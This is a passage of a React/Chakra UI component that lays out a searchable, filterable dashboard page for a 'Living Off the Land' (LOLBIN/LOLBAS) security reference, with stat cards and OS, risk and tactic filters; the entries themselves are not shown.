          <Heading fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
            Living Off the Land <Text as="span" color="red.400">Reference</Text>
          </Heading>
          <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
            LOLBIN / LOLBAS — built-in binaries abused for execution, persistence, lateral movement and evasion
          </Text>
        </Box>
      </Flex>

      {/* ── Stats ── */}
      <SimpleGrid columns={{ base: 2, md: 4 }} gap={3} mb={5}>
        <StatCard label="Total Entries"  value={LOLBINS.length}                                               color={ACCENT}  />
        <StatCard label="Windows"        value={LOLBINS.filter(e => e.os === 'Windows').length}               color={BLUE}    />
        <StatCard label="Linux / Any"    value={LOLBINS.filter(e => e.os === 'Linux' || e.os === 'Any').length} color={GREEN} />
        <StatCard label="Critical Risk"  value={LOLBINS.filter(e => e.risk === 'Critical').length}            color={RED}     />
      </SimpleGrid>

      {/* ── Search + filters ── */}
      <Box mb={4}>
        <InputGroup size="md" mb={3}>
          <InputLeftElement pointerEvents="none" pl={1}>
            <SearchIcon boxSize={4} color="var(--dash-text-muted)" />
          </InputLeftElement>
          <Input
            value={search} onChange={e => setSearch(e.target.value)}
            placeholder="Search by name, description, tactic or command…"
            bg="var(--dash-card-bg)" borderColor="var(--dash-card-border)"
            borderRadius="10px" color="var(--dash-text-primary)" fontSize="sm"
            _placeholder={{ color: 'var(--dash-text-muted)' }}
            _hover={{ borderColor: `${ACCENT}60` }}
            _focus={{ borderColor: ACCENT, boxShadow: `0 0 0 1px ${ACCENT}55` }}
            pr={search ? '44px' : '14px'}
          />
          {search && (
            <InputRightElement>
              <IconButton icon={<CloseIcon boxSize={2.5} />} size="xs" variant="ghost"
                color="var(--dash-text-muted)" _hover={{ color: 'white' }}
                aria-label="Clear" onClick={() => setSearch('')} />
            </InputRightElement>
          )}
        </InputGroup>

        {/* OS filter */}
        <Flex gap={2} mb={2} flexWrap="wrap">
          <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
            textTransform="uppercase" letterSpacing="wide" alignSelf="center" mr={1}>OS</Text>
          {ALL_OS.map(os => (
            <FilterPill key={os} label={os} active={filterOS === os}
              color={OS_COLORS[os] || ACCENT}
              onClick={() => setFilterOS(os)} />
          ))}
        </Flex>

        {/* Risk filter */}
        <Flex gap={2} mb={2} flexWrap="wrap">
          <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
            textTransform="uppercase" letterSpacing="wide" alignSelf="center" mr={1}>Risk</Text>
          {ALL_RISKS.map(r => (
            <FilterPill key={r} label={r} active={filterRisk === r}
              color={RISK_COLORS[r] || ACCENT}
              onClick={() => setFilterRisk(r)} />
          ))}
        </Flex>

        {/* Tactic filter */}
        <Flex gap={2} flexWrap="wrap">
          <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
            textTransform="uppercase" letterSpacing="wide" alignSelf="center" mr={1}>Tactic</Text>
          {ALL_TACTICS.map(t => (
            <FilterPill key={t} label={t} active={filterTactic === t}
              color={TACTIC_COLORS[t] || ACCENT}
              onClick={() => setFilterTactic(t)} />
          ))}
        </Flex>
      </Box>

      {/* ── Results count ── */}
      <Flex align="center" gap={2} mb={4}>
        <Box px="10px" py="3px" borderRadius="20px"
          bg={`${ACCENT}12`} border={`1px solid ${ACCENT}25`}>
          <Text fontSize="11px" fontWeight="bold" color={ACCENT}>{filtered.length}</Text>
        </Box>
        <Text fontSize="12px" color="var(--dash-text-muted)">
          {filtered.length === LOLBINS.length ? 'entries' : `of ${LOLBINS.length} entries`}
        </Text>
      </Flex>

      {/* ── Grid ── */}
      <AnimatePresence>
        {filtered.length === 0 ? (
          <MotionBox key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
            textAlign="center" py={14} borderRadius="14px"
            bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)">
            <Text fontSize="13px" color="var(--dash-text-muted)">No entries match your filters.</Text>
          </MotionBox>
        ) : (
          <SimpleGrid key="grid" columns={{ base: 1, lg: 2, xl: 3 }} gap={4}>
            {filtered.map(e => <LolCard key={e.name} entry={e} />)}
          </SimpleGrid>
        )}
      </AnimatePresence>
    </Box>
  );
};

export default LolbinView;
